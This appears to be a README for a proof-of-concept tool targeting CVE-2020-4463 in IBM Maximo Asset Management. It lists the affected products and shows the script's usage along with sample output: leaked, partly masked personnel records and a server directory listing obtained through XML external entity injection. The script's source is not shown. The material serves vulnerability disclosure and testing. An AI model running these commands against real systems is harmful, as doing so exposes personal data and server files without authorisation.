# IBM Maximo Asset Management is vulnerable to Information Disclosure via XXE Vulnerability (CVE-2020-4463)

IBM Maximo Asset Management is vulnerable to an XML External Entity Injection (XXE) attack when processing XML data. A remote attacker could exploit this vulnerability to expose sensitive information or consume memory resources.

Base Score: 8.2

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L

### Affected Core Components
IBM Maximo Asset Management	7.6.0<br />
IBM Maximo Asset Management	7.6.1<br />
IBM Maximo Asset Management all Verisons befor 7.6.0

### Affected Products
Maximo for Aviation<br />
Maximo for Life Sciences<br />
Maximo for Nuclear Power<br />
Maximo for Oil and Gas<br />
Maximo for Transportation<br />
Maximo for Utilities<br />
SmartCloud Control Desk<br />
IBM Control Desk<br />
Tivoli Integration Composer<br />

### Patched in Version
Fixed Version: 	Maximo Asset Management 7.6.1.2<br /> 
prior Versions: See workaround (link below)

### Links:
- https://nvd.nist.gov/vuln/detail/CVE-2020-4463
- https://www.ibm.com/support/pages/node/6253953

### PoC
Here now the PoC for the vulnerability. Not only the versions mentioned by IBM are vulnerable. All versions befor version 7.6.0 can be also vulnerable.

The PoC checks 2 vulnerabilities that might be present on the system. A data leakage vulnerability that can be exploited if no authentication is implemented and the XXE vulnerability that can be exploited if a certain value (mxe.int.resolvexmlextentity=0) is not set in the configuration.

### Example

#### Usage

```
python3 CVE-2020-4463.py --help
usage: CVE-2020-4463.py [-h] [-x [XXE]] [-d [DATALEAK]] [--url [URL]]

CVE-2020-4463 PoC Data Leakage and XXE

optional arguments:
  -h, --help            show this help message and exit
  -x [XXE], --xxe [XXE]
                        XXE (Linux/Windows)
  -d [DATALEAK], --dataleak [DATALEAK]
                        Data Leakage REST request MXPERSON. May take a long
                        time.
  --url [URL]           Target URL http://, https://
```

If you get following response, both vulnerabilities are not present.

```
Error 500: BMXAA1268E - No user credentials.
```

#### Data Leakage

May take a long time if the database contains many entries.

```
CVE-2020-4463 git:(master) ✗ python3 CVE-2020-4463.py --url https://10.0.0.1 -d

<?xml version="1.0" encoding="UTF-8"?>
<QueryMXPERSONResponse xmlns="http://www.ibm.com/maximo" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    creationDateTime="2020-11-16T10:42:49+01:0 0" transLanguage="EN" baseLanguage="EN"
    messageID="6927296.160551977018422092" maximoVersion="7 6 20170418-0100 V7608-61" rsStart="0" rsTotal="4374"
    rsCount="4374">
    <MXPERSONSet>
        <PERSON>
            <ADDRESSLINE1></ADDRESSLINE1>
            <CITY></CITY>
            <CLASSSTRUCTUREID></CLASSSTRUCTUREID>
            <COUNTRY></COUNTRY>
            <C_DESCRIZIONE></C_DESCRIZIONE>
            <C_MATRICOLA></C_MATRICOLA>
            <C_QUALIFICA></C_QUALIFICA>
            <FIRSTNAME>Lxxxxxxx</FIRSTNAME>
            <LANGUAGE>IT</LANGUAGE>
            <LASTNAME>xxxxxx</LASTNAME>
            <PERSONID>Lxxxxxxx</PERSONID>
            <POSTALCODE></POSTALCODE>
            <PRIMARYEMAIL>xxxx@xxxx.xxx</PRIMARYEMAIL>
            <PRIMARYPHONE></PRIMARYPHONE>
            <STATEPROVINCE></STATEPROVINCE>
            <STATUS maxvalue="ACTIVE">ACTIVE</STATUS>
            <TITLE></TITLE>
            <USERNOTFTYPE></USERNOTFTYPE>
            <EMAIL>
                <EMAILADDRESS>xxxx@xxxx.xxx</EMAILADDRESS>
            </EMAIL>
        </PERSON>
```

#### XXE

```
CVE-2020-4463 git:(master) ✗ python3 CVE-2020-4463.py --url https://10.0.0.1 -x          

Error 500: BMXAA4160E - A major exception has occurred. Check the system log to see if there are any companion errors logged. Report this error to your system administrator.
	/c: &#40;No such file or directory&#41;
Error 500: For input string: &quot;bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost&#43;found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
&quot;
```